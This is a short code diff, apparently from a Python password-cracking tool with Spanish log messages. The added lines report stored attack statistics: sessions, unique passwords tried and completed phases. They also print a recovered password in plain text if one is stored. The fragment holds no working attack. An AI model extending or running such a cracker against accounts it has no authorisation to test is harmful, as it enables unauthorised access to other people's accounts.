+            self.log(f"   Sesiones de ataque: {stats['attack_sessions']}", "INFO")
+            self.log(f"   Contraseñas únicas probadas: {stats['total_unique_passwords']}", "INFO")
+            self.log(f"   Fases completadas: {', '.join(stats['phases_completed']) or 'Ninguna'}", "INFO")
+            
+            if stats.get('successful_password'):
+                self.log(f"   🎉 YA FUE CRACKEADA: {stats['successful_password']} ({stats['crack_date']})", "SUCCESS")
+                return True  # Ya fue crackeada
+            else:
+                self.log(f"   🔒 Aún sin crackear - continuando con nuevas estrategias", "WARNING")
+        
+        return False
 
     def cleanup(self):
         """Limpieza del sistema"""
